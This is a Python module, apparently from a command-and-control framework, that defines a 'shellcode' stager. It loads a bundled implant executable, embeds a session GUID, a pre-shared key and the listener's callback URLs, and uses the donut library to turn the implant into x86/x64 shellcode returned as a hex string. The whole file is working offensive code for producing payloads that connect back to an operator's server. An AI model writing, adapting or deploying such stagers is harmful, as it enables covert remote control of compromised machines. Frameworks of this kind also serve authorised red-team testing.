import uuid
import donut

from blackbot.core.wss.crypto import gen_stager_psk
from blackbot.core.wss.stager import Stager
from blackbot.core.utils import get_path_in_package, shellcode_to_hex_string


class ARTIC2Stager(Stager):
    def __init__(self):
        self.name = 'shellcode'
        self.description = 'Generate a shellcode payload'
        self.suggestions = ''
        self.extension = 'txt'
        self.last_updated_by = '@glides'
        self.options = {
            'Architecture': {
                'Description': 'Architecture (x64, x86, x64+x86). [Warning: getting this wrong will crash things]',
                'Required': False,
                'Value': 'x64+x86'
            }
        }

    def generate(self, listener):
        with open(get_path_in_package('core/wss/data/naga.exe'), 'rb') as assembly:
            guid = uuid.uuid4()
            psk = gen_stager_psk()

            c2_urls = ','.join(
                filter(None,
                       [listener['CallBackURls']])
            )

            arch = 3

            # User can specify 64-bit or 32-bit
            if self.options['Architecture']['Value'] == 'x64':
                arch = 2
            elif self.options['Architecture']['Value'] == 'x86':
                arch = 1

            donut_shellcode = donut.create(file=get_path_in_package('core/wss/data/naga.exe'),
                                           params=f"{guid};{psk};{c2_urls}", arch=arch)

            shellcode = shellcode_to_hex_string(donut_shellcode)

            return guid, psk, shellcode
